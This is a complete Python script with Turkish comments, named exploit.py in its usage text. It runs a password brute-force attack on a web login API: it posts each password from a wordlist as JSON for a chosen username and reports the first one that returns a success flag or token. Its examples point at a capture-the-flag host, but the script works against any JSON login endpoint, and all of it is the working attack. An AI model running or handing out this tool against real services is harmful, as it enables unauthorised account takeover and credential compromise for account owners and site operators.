#!/usr/bin/env python3
import sys
import requests

def main():
    # Komut satırı argüman kontrolü
    if len(sys.argv) < 4:
        print(f"Kullanım: {sys.argv[0]} <URL> <username> <password_file> [--verbose]")
        print("Örnek 1: python3 exploit.py http://ctf.com john passwords.txt")
        print("Örnek 2: python3 exploit.py http://ctf.com admin passlist.txt --verbose")
        sys.exit(1)

    # Argümanları al
    url = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]
    verbose = "--verbose" in sys.argv

    # Şifre dosyasını oku
    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Dosya okuma hatası: {e}")
        sys.exit(1)

    print(f"\n[+] Brute-force başlatılıyor...")
    print(f"[+] Hedef URL: {url}")
    print(f"[+] Kullanıcı Adı: {username}")
    print(f"[+] Denenecek Şifre Sayısı: {len(passwords)}")
    print(f"[+] Verbose Mod: {'Açık' if verbose else 'Kapalı'}\n")

    for index, password in enumerate(passwords, 1):
        # JSON verisi hazırla
        payload = {
            'username': username,
            'password': password
        }

        try:
            if verbose:
                print(f"[{index}/{len(passwords)}] Deneniyor: {username}:{password}")

            # POST isteği gönder
            response = requests.post(
                url,
                json=payload,
                timeout=10,
                headers={'User-Agent': 'ExploitScript/1.0'}
            )

            # Başarı kontrolü (API yanıtına göre özelleştirin)
            if response.status_code == 200:
                response_data = response.json()
                
                # Farklı başarı durumları için kontrol
                if ('success' in response_data and response_data['success']) or \
                   ('token' in response_data) or \
                   ('status' in response_data and response_data['status'] == 'ok'):
                    print(f"\n[+] BAŞARILI GİRİŞ!")
                    print(f"[+] Kullanıcı: {username}")
                    print(f"[+] Şifre: {password}")
                    print(f"[+] Yanıt: {response.text[:200]}...")  # Uzun yanıtları kısalt
                    sys.exit(0)
                
                elif verbose:
                    print(f"[-] Başarısız - HTTP {response.status_code} - Yanıt: {response.text[:100]}")

            elif verbose:
                print(f"[-] HTTP {response.status_code} - {password}")

        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"[!] Hata: {password} - {str(e)}")
            continue

    print("\n[!] Başarılı giriş bulunamadı. Tüm şifreler denendi.")

if __name__ == "__main__":
    main()
